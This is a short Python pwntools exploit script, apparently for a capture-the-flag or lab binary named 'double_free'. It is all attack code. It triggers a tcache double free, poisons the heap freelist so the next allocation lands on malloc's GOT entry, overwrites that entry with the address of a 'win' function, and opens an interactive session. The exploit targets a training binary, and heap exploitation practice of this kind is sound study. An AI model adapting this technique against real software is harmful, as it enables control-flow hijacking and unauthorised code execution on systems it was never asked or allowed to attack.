#!/usr/bin/python3
from pwn import *
#context.log_level='DEBUG'

p = process("./double_free", env={"LD_PRELOAD":"../use_after_free/libc.so.6"})
elf = ELF("./double_free", checksec=False)

END_OF_MENU = b"e.g, l\n"

def malloc(size):
	p.send(b"m %d" % size)
	p.recvuntil(END_OF_MENU)

def free(idx):
	p.sendline(b"f %d" % idx)
	p.recvuntil(END_OF_MENU)

def edit(idx, data):
	p.send(b"e %d %b" % (idx, data))
	p.recvuntil(END_OF_MENU)

def list():
	p.send("l")
	pointers = p.recvline()
	log.info(pointers)
	p.recvuntil(END_OF_MENU)

if __name__=="__main__":

	pause()
	malloc(8) # 0
	free(0)
	free(0)
	malloc(8) # 1
	edit(1, p64(elf.got['malloc']))
	malloc(8) # 2
	malloc(8) # 3
	edit(3, p64(elf.symbols['win']))
	malloc(8)

	p.interactive()

